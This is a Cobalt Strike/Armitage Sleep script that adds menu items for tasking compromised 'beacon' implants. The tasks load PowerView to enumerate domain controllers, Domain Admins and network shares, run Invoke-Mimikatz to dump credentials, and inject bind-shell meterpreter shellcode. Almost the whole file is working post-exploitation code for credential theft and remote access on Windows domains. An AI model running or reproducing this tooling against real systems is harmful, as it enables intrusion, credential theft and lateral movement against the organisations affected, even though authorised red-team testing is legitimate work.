import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;
import console.*;
import armitage.*;
import cloudstrike.*;

on heartbeat_10s {
   local('@beacons $beacon $bid %data @new @all');

   # grab all beacon ids AND build a map between ids and data
   @beacons = beacons();
   foreach $beacon (@beacons) {
   $bid = $beacon['id'];
   %data[$bid] = $beacon;
   push(@all, $bid);
   }
}

sub task_powershell_import {
    # task ID ($1) with powershell command + args ($2)
    local('$id $len');

    $id = $1;
    $data = $2;
    $len = strlen($data);

    # task beacon to import the PowerShell script
    call("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
    call("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
}

sub task_powershell {

    $id = $1;
    $len  = strlen($2);

    call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
    call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
}

sub task_get_dcs {
   $beacon_id = $1;

   $script_source = script_resource("PowerView.ps1");

   # get all of our data that we're going to upload
   $handle = openf($script_source);
   $data = readb($handle, -1);
   closef($handle);

   # task the beacon to import the powershell data
   task_powershell_import($beacon_id, $data);

   # actually task the beacon
   call("beacon.log_write", $beacon_id, "[*] DOMAIN CONTROLLERS:");
   task_powershell($beacon_id, "Get-NetDomainControllers -Verbose");
}

sub task_get_domain {
   $beacon_id = $1;

   $script_source = script_resource("PowerView.ps1");

   # get all of our data that we're going to upload
   $handle = openf($script_source);
   $data = readb($handle, -1);
   closef($handle);

   # task the beacon to import the powershell data
   task_powershell_import($beacon_id, $data);

   # actually task the beacon
   call("beacon.log_write", $beacon_id, "[*] DOMAIN:");
   task_powershell($beacon_id, "Get-NetDomain");
}

sub task_get_dom-admins {
   $beacon_id = $1;

   $script_source = script_resource("PowerView.ps1");

   # get all of our data that we're going to upload
   $handle = openf($script_source);
   $data = readb($handle, -1);
   closef($handle);

   # task the beacon to import the powershell data
   task_powershell_import($beacon_id, $data);

   # actually task the beacon
   call("beacon.log_write", $beacon_id, "[*] DOMAIN ADMINS:");
   task_powershell($beacon_id, 'Get-NetGroup -GroupName "Domain Admins"');
}

sub task_netview {
   $beacon_id = $1;

   $script_source = script_resource("PowerView.ps1");

   # get all of our data that we're going to upload
   $handle = openf($script_source);
   $data = readb($handle, -1);
   closef($handle);

   # task the beacon to import the powershell data
   task_powershell_import($beacon_id, $data);

   # actually task the beacon
   task_powershell($beacon_id, "Invoke-Netview -Ping -ExcludeShares -Delay 10");
}

sub task_mimikatz {
   $beacon_id = $1;

   $script_source = script_resource("Invoke-Mimikatz.ps1");

   # get all of our data that we're going to upload
   $handle = openf($script_source);
   $data = readb($handle, -1);
   closef($handle);

   # task the beacon to import the powershell data
   task_powershell_import($beacon_id, $data);

   # actually task the beacon
   task_powershell($beacon_id, "Invoke-Mimikatz -DumpCreds");
}

sub task_meterpreter {
  thread(lambda({
  local('$port $data $len $id %o');
  $port  = randomPort();

  # generate shellcode...
  %o = %(Format => "raw", Encoder => "generic/none", Iterations => "0", LPORT => $port);
  $data = generateBindShellcode($port);
  $len  = strlen($data);

  # task our beacons...
  foreach $id (@ids) {
    call("beacon.task", $id, pack("IIII", 0x04, 8, 100, 90), $MY_ADDRESS);
    call("beacon.task", $id, pack("IISZ $+ $len", 0x012, $len + 2, $port, $data), $MY_ADDRESS);
    call("beacon.log_write", $id, "[*] Tasked beacon to inject meterpreter (bound to $port $+ )\n");
  }
  }, @ids => $1));
}

###
popup beacon_top {
   item "Get Domain" {
     local('$bid');
     foreach $bid ($1) {
        task_get_domain($bid);
     }
   }

   item "Enum Domain" {
     local('$bid');
     foreach $bid ($1) {
        task_get_dcs($bid);
        task_get_dom-admins($bid);
     }
   }

   item "Invoke-NetView" {
     local('$bid');
     foreach $bid ($1) {
        task_netview($bid);
     }
   }

   item "Invoke-Mimikatz" {
     local('$bid');
     foreach $bid ($1) {
        task_mimikatz($bid);
     }
   }
}